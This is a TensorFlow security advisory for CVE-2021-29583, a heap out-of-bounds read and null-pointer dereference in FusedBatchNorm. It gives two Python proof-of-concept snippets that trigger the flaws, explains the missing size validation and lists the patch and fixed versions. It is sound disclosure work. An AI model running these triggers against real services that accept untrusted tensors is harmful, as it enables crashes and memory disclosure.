<h2>TFSA-2021-072: Heap buffer overflow and undefined behavior in <code>FusedBatchNorm</code></h2>
<h3>CVE Number</h3>
<p>CVE-2021-29583</p>
<h3>Impact</h3>
<p>The implementation of <code>tf.raw_ops.FusedBatchNorm</code> is vulnerable to a heap buffer
overflow:</p>
<p>```python
import tensorflow as tf</p>
<p>x = tf.zeros([10, 10, 10, 6], dtype=tf.float32)
scale = tf.constant([0.0], shape=[1], dtype=tf.float32)
offset = tf.constant([0.0], shape=[1], dtype=tf.float32)
mean = tf.constant([0.0], shape=[1], dtype=tf.float32)
variance = tf.constant([0.0], shape=[1], dtype=tf.float32)
epsilon = 0.0
exponential_avg_factor = 0.0
data_format = "NHWC"
is_training = False</p>
<p>tf.raw_ops.FusedBatchNorm(
  x=x, scale=scale, offset=offset, mean=mean, variance=variance,
  epsilon=epsilon, exponential_avg_factor=exponential_avg_factor,
  data_format=data_format, is_training=is_training)
```</p>
<p>If the tensors are empty, the same implementation can trigger undefined behavior
by dereferencing null pointers:</p>
<p>```python
import tensorflow as tf
import numpy as np</p>
<p>x = tf.zeros([10, 10, 10, 1], dtype=tf.float32)
scale = tf.constant([], shape=[0], dtype=tf.float32)
offset = tf.constant([], shape=[0], dtype=tf.float32)
mean = tf.constant([], shape=[0], dtype=tf.float32)
variance = tf.constant([], shape=[0], dtype=tf.float32)
epsilon = 0.0
exponential_avg_factor = 0.0
data_format = "NHWC"
is_training = False</p>
<p>tf.raw_ops.FusedBatchNorm(
  x=x, scale=scale, offset=offset, mean=mean, variance=variance,
  epsilon=epsilon, exponential_avg_factor=exponential_avg_factor,
  data_format=data_format, is_training=is_training)
```</p>
<p>The
<a href="https://github.com/tensorflow/tensorflow/blob/57d86e0db5d1365f19adcce848dfc1bf89fdd4c7/tensorflow/core/kernels/fused_batch_norm_op.cc">implementation</a>
fails to validate that <code>scale</code>, <code>offset</code>, <code>mean</code> and <code>variance</code> (the last two
only when required) all have the same number of elements as the number of
channels of <code>x</code>. This results in heap out of bounds reads when the buffers
backing these tensors are indexed past their boundary.</p>
<p>If the tensors are empty, the validation mentioned in the above paragraph would
also trigger and prevent the undefined behavior.</p>
<h3>Patches</h3>
<p>We have patched the issue in GitHub commit
<a href="https://github.com/tensorflow/tensorflow/commit/6972f9dfe325636b3db4e0bc517ee22a159365c0">6972f9dfe325636b3db4e0bc517ee22a159365c0</a>.</p>
<p>The fix will be included in TensorFlow 2.5.0. We will also cherrypick this
commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow
2.1.4, as these are also affected and still in supported range.</p>
<h3>For more information</h3>
<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security
guide</a> for
more information regarding the security model and how to contact us with issues
and questions.</p>
<h3>Attribution</h3>
<p>This vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu
X-Team.</p>